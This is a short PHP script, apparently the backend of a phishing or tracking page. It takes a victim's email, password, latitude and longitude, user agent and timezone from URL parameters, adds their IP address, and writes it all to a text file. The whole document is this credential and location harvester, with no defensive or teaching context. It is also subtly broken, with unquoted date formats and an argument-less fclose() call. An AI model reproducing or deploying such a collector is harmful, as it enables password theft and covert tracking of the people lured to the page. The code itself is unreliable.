<?php 
date_default_timezone_set("Africa/Lagos"); /* the IANA timezone of NIG is Africa/Lagos */
$lat = $_GET["lat"];
$time = date(h:i:sa);
$pass = $_GET["pass"];
$long = $_GET["long"];
$email = $_GET["email"];
$date = date(dd-mm-YYYY);
$status = $_GET["status"];
$uAgent = $_GET["userAgent"];
$timezone = $_GET["timezone"];
$myFile = fopen("location.txt", "w");
$myDatas = "==========[".$date."]==========\n\tStatus: ".$status."\n\tTime: ".$time."\n\tLat: ".$lat."\n\tLong: ".$long."\n\tEmail: ".$email."\n\tPswd: ".$pass."\n\tIP_Addr: ".$_SERVER["REMOTE_ADDR"]."\n\tTime_Zone: ".$timezone."\n\tUser_Agent: ".$uAgent."\n================================\n\n";
fwrite($myFile, $myDatas);
fclose();
exit(); 
?>
